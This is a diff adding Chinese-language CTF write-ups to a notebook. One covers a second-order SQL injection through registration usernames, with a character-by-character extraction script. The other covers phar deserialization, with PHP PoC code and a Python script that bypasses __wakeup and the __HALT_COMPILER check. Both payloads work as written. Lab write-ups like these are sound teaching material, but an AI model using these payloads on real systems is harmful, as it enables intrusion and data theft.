@@ -9226,6 +9226,277 @@ DSDB
 
 这里又有一个坑。假如还是去/tmp目录下读取flag，就会得到一个高仿的flag，比真实的长一点点。这里要去**/var/www/html/flag_8946e1ff1ee3e40f.php**才是真的
 
+## BUUOJ [网鼎杯2018]Unfinish
+
+进来注册账户并登录，可以看到用户名的回显位
+
+![image-20240513203012605](CTF.assets/image-20240513203012605.png)
+
+而且登录的时候不需要填写用户名，推测注入点就在用户名这里，注册用户`0'||'1`，可以看到注入成功~
+
+![image-20240513203143184](CTF.assets/image-20240513203143184.png)
+
+![image-20240513203200382](CTF.assets/image-20240513203200382.png)
+
+这里有一点，题目过滤逗号，需要使用`from x for 1`绕过
+
+```sql
+mysql> select substr((select username from users limit 1), 1,1);
++---------------------------------------------------+
+| substr((select username from users limit 1), 1,1) |
++---------------------------------------------------+
+| D                                                 |
++---------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> select substr((select username from users limit 1) from 1 for 1);
++-----------------------------------------------------------+
+| substr((select username from users limit 1) from 1 for 1) |
++-----------------------------------------------------------+
+| D                                                         |
++-----------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> select ascii(substr((select username from users limit 1) from 1 for 1));
++------------------------------------------------------------------+
+| ascii(substr((select username from users limit 1) from 1 for 1)) |
++------------------------------------------------------------------+
+|                                                               68 |
++------------------------------------------------------------------+
+1 row in set (0.00 sec)
+
+mysql> select '0' + ascii(substr((select username from users limit 1) from 1 for 1)) +'0';
++-----------------------------------------------------------------------------+
+| '0' + ascii(substr((select username from users limit 1) from 1 for 1)) +'0' |
++-----------------------------------------------------------------------------+
+|                                                                          68 |
++-----------------------------------------------------------------------------+
+```
+
+猜测目标为flag表，得到payload如下：
+
+```
+0' + ascii(substr((select * from flag) from 1 for 1)) +'0
+```
+
+上脚本：
+
+```py
+import requests
+import re
+
+register_url = 'http://50061ff1-2e85-461f-9d81-42ec043eadb9.node5.buuoj.cn:81/register.php'
+login_url = 'http://50061ff1-2e85-461f-9d81-42ec043eadb9.node5.buuoj.cn:81/login.php'
+
+flag = ''
+for i in range(1, 51):
+    register_data = {
+        'email': 'py{}@qq.com'.format(str(i)),
+        'username': "0' + ascii(substr((select * from flag) from {} for 1)) +'0".format(str(i)),
+        'password': '1212'
+    }
+
+    register_response = requests.post(register_url, data=register_data)
+
+    login_data = {
+        'email': 'py{}@qq.com'.format(str(i)),
+        'password': '1212'
+    }
+
+    login_response = requests.post(login_url, data=login_data)
+
+    num = re.search('<span class="user-name">\n(.*?)</span>', login_response.text)
+    # print(login_response.text)
+    flag += chr(int(num.group(1).split()[0]))
+    print(flag)
+```
+
+## 广东省大学生攻防大赛 - unserialize_web
+
+> 参考：https://blog.csdn.net/qq_62046696/article/details/127195593
+
+目录扫描拿到源码
+
+![img](CTF.assets/17156037722981.png)
+
+源码如下：
+
+```PHP
+# update.php
+<?php
+if ($_FILES["file"]["error"] > 0) {
+    echo "文件上传出错";
+} else {
+    $extensions = array("gif", "jpg", "png");
+    $temp = explode(".", $_FILES["file"]["name"]);
+    // 获取文件后缀
+    $fileExtension = end($temp);
+    $fileSizeCheck = $_FILES["file"]["size"];
+    // 判断是否在白名单
+    $isExtensionAllowed = in_array($fileExtension, $extensions) ? true : false;
+    if ($fileSizeCheck && $isExtensionAllowed) {
+        $fileContent = file_get_contents($_FILES["file"]["tmp_name"]);
+
+        $haltCompilerCheck = strpos($fileContent, "__HALT_COMPILER();");
+        if (gettype($haltCompilerCheck) === "integer") {
+            echo "phar";
+        } else {
+            if (file_exists("./upload/" . $_FILES["file"]["name"])) {
+                echo $_FILES["file"]["name"] . " 文件已经存在";
+            } else {
+                $fileHandle = fopen("./upload/" . $_FILES["file"]["name"], "w");
+                fwrite($fileHandle, $fileContent);
+                fclose($fileHandle);
+                echo "上传成功 ./upload/" . $_FILES["file"]["name"];
+            }
+        }
+    } else {
+        echo "不允许上传 ." . $fileExtension;
+    }
+}
+
+function obfuscateCode($code)
+{
+    $a = strrev($code);
+    $b = base64_encode($a);
+    return $b;
+}
+
+function deobfuscateCode($code)
+{
+    $a = base64_decode($code);
+    $b = strrev($a);
+    return $b;
+}
+
+obfuscateCode($_SERVER["PHP_SELF"]);
+# download.php
+<?php
+
+$file = $_POST['file'];
+
+if (isset($_POST['file'])) {
+    if (preg_match("/flag/", $file)) {
+        die("Access Denied");
+    }
+
+    $forbidden_paths = array("/etc/");
+    foreach ($forbidden_paths as $forbidden_path) {
+        if (strpos($file, $forbidden_path) === 0) {
+            die("Access Denied");
+        }
+    }
+
+    if (strpos($file, '../') !== false || strpos($file, '..\\') !== false) {
+        die("Access Denied");
+    }
+
+    echo file_get_contents($file);
+}
+
+class File
+{
+    public $val1;
+    public $val2;
+    public $val3;
+
+    public function __construct()
+    {
+        $this->val1 = "val1";
+        $this->val2 = "val2";
+    }
+
+    public function __destruct()
+    {
+        if ($this->val1 === "file" && $this->val2 === "exists") {
+            if (preg_match('/^\s*system\s*\(\s*\'cat\s+\/[^;]*\'\s*\);\s*$/', $this->val3)) {
+                eval($this->val3);
+            } else {
+                echo "Access Denied";
+            }
+        }
+    }
+
+    public function __access()
+    {
+        $Var = "Access Denied";
+        echo $Var;
+    }
+
+    public function __wakeup()
+    {
+        $this->val1 = "exists";
+        $this->val2 = "file";
+        echo "文件存在";
+    }
+}
+```
+
+从过滤和给出的类很明显就可以看出考的是`phar`的文件上传，主要有两个绕过点：
+
+1. `update.php：$haltCompilerCheck = strpos($fileContent, "__HALT_COMPILER();");`，不允许上传的文件内容有`__HALT_COMPILER();`
+2. `__wakeup`函数绕过
+
+总结：上传的文件不允许有`__HALT_COMPILER();并且序列化的字符串元素个数需要比实际的多以至于绕过`__wakeup
+
+Phar 文件生成POC
+
+```PHP
+<?php
+
+class File
+{
+    public $val1 = "file";
+    public $val2 = "exists";
+    public $val3 = "system('cat /flag');";
+
+    public function __destruct()
+    {
+        if ($this->val1 === "file" && $this->val2 === "exists") {
+            if (preg_match('/^\s*system\s*\(\s*\'cat\s+\/[^;]*\'\s*\);\s*$/', $this->val3)) {
+                eval($this->val3);
+            } else {
+                echo "Access Denied";
+            }
+        }
+    }
+}
+
+
+@unlink("test.phar");
+$phar = new Phar("test.phar"); //后缀名必须为phar
+$phar->startBuffering();
+$phar->setStub("<?php __HALT_COMPILER(); ?>");
+$o = new File();
+$phar->setMetadata($o); //将自定义的meta-data存入manifest，这里的内容后续在做包含的时候会自动被反序列化
+$phar->addFromString("test.txt", "test"); //添加要压缩的文件
+$phar->stopBuffering();    //签名自动计算
+```
+
+将生成的phar后缀文件丢进下面的python代码中修改属性值和签名即可，记得修改后缀名
+
+```Python
+import gzip
+from hashlib import sha1
+
+with open('test.phar', 'rb') as file:
+    f = file.read()
+s = f[:-28]  # 获取要签名的数据
+s = s.replace(b'3:{', b'4:{')  # 更换属性值，绕过__wakeup
+h = f[-8:]  # 获取签名类型以及GBMB标识
+newf = s + sha1(s).digest() + h  # 数据 + 签名 + (类型 + GBMB)
+# print(newf)
+newf = gzip.compress(newf)  # 对Phar文件进行gzip压缩
+with open('test.phar', 'wb') as file:  # 更改文件后缀
+    file.write(newf)
+```
+
+上传文件之后访问`download.php`POST传参`file=phar://upload/test.jpg`
+
+![img](CTF.assets/17156037985274.png)
+
+# Crypto
+
 
 
 # Misc
